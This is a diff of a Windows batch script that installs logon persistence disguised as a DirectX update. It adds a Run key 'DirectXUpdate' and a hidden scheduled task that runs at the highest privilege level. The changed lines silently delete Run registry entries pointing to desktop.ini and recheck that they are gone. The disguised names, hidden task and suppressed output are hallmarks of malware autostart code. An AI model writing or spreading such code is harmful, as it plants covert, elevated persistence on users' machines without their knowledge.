@@ -105,7 +105,41 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DirectXUpdate" 
 
 SCHTASKS /Create /TN "DirectXUpdateHidden" /TR "\"%DirectXUpdate_BAT_FILE%\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
 
-powershell -WindowStyle Hidden -Command "Remove-Item '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini' -Force -ErrorAction SilentlyContinue"
+:: Remove registry Run values that point to desktop.ini
+for %%K in ("HKCU\Software\Microsoft\Windows\CurrentVersion\Run" "HKLM\Software\Microsoft\Windows\CurrentVersion\Run") do (
+    for /f "tokens=1,*" %%A in ('reg query %%K 2^>nul ^| findstr /R /C:"^[ ]*[^ ]"') do (
+        for /f "tokens=2,*" %%X in ('reg query %%K /v "%%~nxA" 2^>nul ^| findstr /R /C:"REG_"') do (
+            echo %%Y | findstr /I "desktop.ini" >nul
+            if not errorlevel 1 (
+                reg delete %%K /v "%%~nxA" /f >nul 2>&1
+            )
+        )
+    )
+)
+
+:: ==========================
+:: Silent double-check desktop.ini cleanup
+:: ==========================
+
+set "ERRORS=0"
+
+if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini" (
+    set /a ERRORS+=1
+)
+if exist "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini" (
+    set /a ERRORS+=1
+)
+
+for %%K in ("HKCU\Software\Microsoft\Windows\CurrentVersion\Run" "HKLM\Software\Microsoft\Windows\CurrentVersion\Run") do (
+    for /f "tokens=1,*" %%A in ('reg query %%K 2^>nul ^| findstr /R /C:"^[ ]*[^ ]"') do (
+        for /f "tokens=2,*" %%X in ('reg query %%K /v "%%~nxA" 2^>nul ^| findstr /R /C:"REG_"') do (
+            echo %%Y | findstr /I "desktop.ini" >nul
+            if not errorlevel 1 (
+                set /a ERRORS+=1
+            )
+        )
+    )
+)
 
 :clean_folder
 if exist "%~1\" (
